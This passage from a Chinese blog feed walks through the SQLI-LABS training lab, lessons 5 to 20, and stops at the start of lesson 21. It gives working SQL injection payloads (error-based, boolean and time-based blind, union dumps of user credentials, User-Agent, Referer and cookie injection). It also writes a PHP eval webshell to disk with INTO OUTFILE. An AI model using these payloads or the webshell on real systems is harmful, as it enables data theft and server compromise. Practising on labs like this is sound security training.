<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND ( extractvalue(1,concat(0x7e,(select @@version),0x7e)))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303165111212.png" alt="image-20210303165111212"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND ( updatexml(1,concat(0x7e,(select @@version),0x7e),1))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303165212710.png" alt="image-20210303165212710"></p>
<ul>
<li>列名重复</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303165518900.png" alt="image-20210303165518900"></p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><ul>
<li>利用 sleep()函数进行注入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
<p>判断当前数据库名字的第一个字符的ascii码是否是115，当错误的时候会有 5 秒的时间延时。</p>
<ul>
<li>利用 BENCHMARK()进行延时注入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39;UNION SELECT (IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BENCHMARK(50000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 FROM (select database() as current) as tb1--+</span><br></pre></td></tr></table></figure>
<p>判断当前数据库名称的第一个字符的ascii码是否是115，当结果正确的时候，运行 ENCODE(‘MSG’,’by 5 seconds’)操作 50000000 次，会占用一段时间。</p>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><ul>
<li>判断闭合方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-6&#x2F;?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>
<p>显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>得出闭合方式为 <code>&quot;$id&quot;</code>，利用方式跟Less-5相同，只需将 <code>&#39;</code> 换成 <code>&quot;</code> 即可。</p>
<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>原码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用单引号加双层括号拼接</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持布尔盲注、延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span>:</span><br><span class="line">    输出 You are in.... <span class="keyword">Use</span> <span class="title">outfile</span>......</span><br><span class="line"><span class="title">else</span>:</span><br><span class="line">    输出 <span class="title">You</span> <span class="title">have</span> <span class="title">an</span> <span class="title">error</span> <span class="title">in</span> <span class="title">your</span> <span class="title">SQL</span> <span class="title">syntax</span></span><br><span class="line">  //<span class="title">print_r</span>(<span class="title">mysql_error</span>());</span><br></pre></td></tr></table></figure>
<p>因为这里把<code>print_r(mysql_error());</code>给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注，本关的标题是 dump into outfile,意思是本关我们利用文件导入的方式进行注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\test.txt&quot;--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303201847730.png" alt="image-20210303201847730"></p>
<p>上图中显示 sql 出错了，但是没有关系，我们可以在文件中看到 test.txt 已经生成</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303203217157.png" alt="image-20210303203217157"></p>
<blockquote>
<p>这里需要说明的是，我所使用的mysql版本中限制了导入与导出的目录权限。只允许在规定的目录下才能导入。secure-file-priv的值为NULL，需要我门在 <code>my.ini</code> 文件下添加 <code>secure_file_priv = </code> 这一行后重启数据库才能够导出文件。</p>
</blockquote>
<p>我们也可以导入一句话木马：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\YIJUHUA.php&quot;--+</span><br></pre></td></tr></table></figure>
<p>我们可以在文件中看到一句话木马已经导入进去了</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303203804170.png" alt="image-20210303203804170"></p>
<p>此时用蚁剑等webshell工具连接即可。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303205124625.png" alt="image-20210303205124625"></p>
<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>这里跟Less-5一样，只不过把错误信息显示给屏蔽掉了，因此这里无法使用报错注入，只能使用盲注。</p>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>题目显示是基于时间的盲注，而且闭合方式是单引号。查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用单引号拼接</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span>:</span><br><span class="line">    输出 You are in............</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    输出 You are in...........</span><br></pre></td></tr></table></figure>
<p>在上一题的基础上改变了无论正确与否都是输出<code>You are in...........</code>，于是乎就无法使用布尔盲注了，只能使用时间盲注。具体方法参考Less-5。</p>
<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>和Less-9的的利用方式一样，只不过参数闭合方式变成了<code>&quot;</code></p>
<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>从这一关开始提交的数据要以POST的方式，这里可以使用Hackbar提交POST数据</p>
<ul>
<li>判断闭合方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39;&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
<p>显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;admin&#39;&#39; and password&#x3D;&#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>看出闭合方式是<code>&#39;</code></p>
<p>构造POST数据即可，注意一定要2个参数都要提交，不然不会显示结果</p>
<ul>
<li>万能密码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;1&#39;or 1&#x3D;1#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39;union select 1,(SELECT GROUP_CONCAT(username,&#39;:&#39;,password) FROM users)#</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303214011749.png" alt="image-20210303214011749"></p>
<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; AND ( extractvalue(1,concat(0x7e,(select @@version),0x7e)))--+</span><br><span class="line">uname&#x3D;admin&#39; AND  (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2)))#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><ul>
<li>布尔盲注</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and left(database(),1)&gt;&#39;r&#39;#&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;admin&#39; and left(database(),1)&gt;&#39;s&#39;#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
<ul>
<li>时间盲注</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))#&amp;passwd&#x3D;</span><br><span class="line">uname&#x3D;admin&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>


<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><ul>
<li>判断闭合方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot;&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
<p>显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;admin&quot;&quot;) and password&#x3D;(&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>得知参数的闭合方式为<code>(&quot;$uname&quot;)</code></p>
<p>其他部分和Less-11相同。</p>
<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><ul>
<li>判断闭合方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39;&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
<p>显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;admin&#39;&#39;) and password&#x3D;(&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>看出参数的闭合方式为<code>(&#39;$uname&#39;)</code></p>
<ul>
<li>尝试万能密码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39;) or 1&#x3D;1#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
<p>发现不会显示登陆信息，也就是说无法使用联合注入</p>
<ul>
<li>尝试报错注入(成功)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39;) AND ( extractvalue(1,concat(0x7e,(select @@version),0x7e)))--+</span><br></pre></td></tr></table></figure>
<ul>
<li>尝试盲注(成功)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">布尔盲注</span><br><span class="line">uname&#x3D;admin&#39;) and left(database(),1)&gt;&#39;r&#39;#&amp;passwd&#x3D;</span><br><span class="line"></span><br><span class="line">时间盲注</span><br><span class="line">uname&#x3D;admin&#39;) and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>


<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><ul>
<li>判断闭合方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; &amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
<p>显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot; and password&#x3D;&quot;&quot; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>看出闭合方式为<code>&quot;$uname&quot;</code>，剩下的部分和Less-13一样。</p>
<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><ul>
<li>判断闭合方式</li>
</ul>
<p>发现无论输入什么都不会显示错误信息，猜测屏蔽了错误信息显示，根据题目提示，闭合方式为<code>&#39;$uname&#39;</code>。</p>
<p>由于屏蔽了错误信息显示，所以无法进行报错注入，同时登陆成功也没有提示信息，也无法进行联合注入，只能进行盲注。参考Less-11。</p>
<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>与Less-15一样，只不过闭合方式改为了<code>&quot;$uname&quot;</code>。</p>
<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><ul>
<li>判断注入点和闭合方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
<p>显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;admin&#39;&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>看出注入点为<code>passwd</code>参数，闭合方式为<code>&#39;$uname&#39;</code></p>
<ul>
<li>报错注入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</span><br></pre></td></tr></table></figure>
<ul>
<li>盲注</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,0,sleep(5))#</span><br></pre></td></tr></table></figure>
<ul>
<li>分析源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，后端对<code>uname</code>参数进行了检查，这里介绍使用到的函数：</p>
<ol>
<li><strong>addslashes()</strong></li>
</ol>
<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>预定义字符是：单引号<code>&#39;</code> ，双引号<code>&quot;</code>，反斜杠<code>\</code>，NULL</p>
<p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
<p>注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您 不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可 以使用函数 get_magic_quotes_gpc() 进行检测。</p>
<ol start="2">
<li><strong>stripslashes()</strong></li>
</ol>
<p>函数删除由 addslashes() 函数添加的反斜杠。</p>
<ol start="3">
<li><strong>mysql_real_escape_string()</strong></li>
</ol>
<p>函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
<p>下列字符受影响：\x00    \n    \r    \    ‘    “    \x1a</p>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</p>
<p>example：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$msg</span>=<span class="string">&quot;I&#x27;m &quot;</span>superman<span class="string">&quot;&quot;</span>;</span><br><span class="line">mysql_real_escape_string(<span class="variable">$msg</span>);</span><br><span class="line"><span class="variable">$msg</span>=<span class="string">&quot;I\&#x27;m \&quot;superman\&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用 于 mysql_query()。</p>
<p>在我们 less17 的 check_input()中，对 username 进行各种转义的处理，所以此处不能使用 username 进行注入。</p>
<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	<span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">	<span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">	<span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="comment">#if SQL语句有返回结果:</span></span><br><span class="line"> <span class="comment">#执行 insert 语句</span></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>可以看出，后端对<code>uname</code> 和<code>passwd</code>两个参数都进行了检查，所以无法从这里进行注入</p>
<p>同时发现这里使用了insert语句直接把<code>$uagent</code>和<code>$IP</code>插入到数据库中，并没有对其进行检查，于是我们就可以考虑利用这两个参数进行注入。</p>
<p><strong>PHP 里用来获取客户端 IP 的变量</strong></p>
<ul>
<li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 这个很少使用，不一定服务器都实现了。客户端可以伪造。</li>
<li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li>
<li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li>
</ul>
<p>这里后端使用了<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>来获取IP地址，所以这里的IP无法被伪造，因此只能考虑在<code>uagent</code>入手。</p>
<ul>
<li>使用Burp Suite抓包改包</li>
</ul>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304174545837.png" alt="image-20210304174545837"></p>
<p>由于在源码中看到，参数闭合的方式是<code>&#39;</code>，且能够返回错误信息，于是采用报错注入比较方便，把图中的User-Agent这一栏改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304174439957.png" alt="image-20210304174439957"></p>
<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>和Less-18基本一样，只不过把<code>$uagent</code>的获取改到了<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>。</p>
<ul>
<li>使用Burp Suite抓包改包</li>
</ul>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304175125637.png" alt="image-20210304175125637"></p>
<p>我们把图中Referer这一栏改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304175232923.png" alt="image-20210304175232923"></p>
<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> cookie 中不存在 uname 参数:  </span><br><span class="line">    输出了一堆无用的信息</span><br><span class="line">    <span class="keyword">if</span> 提交了 uname 和 passwd:</span><br><span class="line">        <span class="comment"># 进行过滤</span></span><br><span class="line">        <span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">        <span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="variable">$cookee</span> = <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> 有查询结果:</span><br><span class="line">            <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, time()+<span class="number">3600</span>);</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> POST 数据里面没有 submit 参数:</span><br><span class="line">        <span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> 查询无结果:</span><br><span class="line">            输出 mysql_error()</span><br><span class="line">        <span class="keyword">if</span> 有结果:</span><br><span class="line">            输出查询的信息</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">        setcookie(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>], time()<span class="number">-3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>分析源码可以看出，当我们提交了<code>uname</code>和<code>passwd</code>两个参数时，都对其进行了严格的检查过滤，无法进行注入，而当我们cookie中存在<code>uname</code>参数且没有提交，只是刷新页面时，那么后端会直接将cookie中的<code>uanme</code>参数进行查询，没有检查过滤，那么我们就可以从这里进行注入。</p>
<ul>
<li>使用hackbar进行添加cookie</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin1&#39;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304180809852.png" alt="image-20210304180809852"></p>
<p>同样地，使用联合注入也能行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;1&#39; UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210304181017713.png" alt="image-20210304181017713"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<ul>
<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLI-LABS (Adv Injections) 21-37关</title>
    <url>/2021/03/07/SQLI-LABS%20(Adv%20Injections)%2021-37%E5%85%B3/</url>
    <content><![CDATA[<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><ul>
<li>查看源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> cookie 中不存在 uname 参数:  </span><br><span class="line">    输出了一堆无用的信息</span><br><span class="line">    <span class="keyword">if</span> 提交了 uname 和 passwd:</span><br><span class="line">        <span class="comment"># 进行过滤</span></span><br><span class="line">        <span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">        <span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> 有查询结果:</span><br><span class="line">            <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), time()+<span class="number">3600</span>);    </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> POST 数据里面没有 submit 参数:</span><br><span class="line">                 <span class="comment"># 对 cookee 进行 base64 解密</span></span><br><span class="line">        <span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> 查询无结果:</span><br><span class="line">            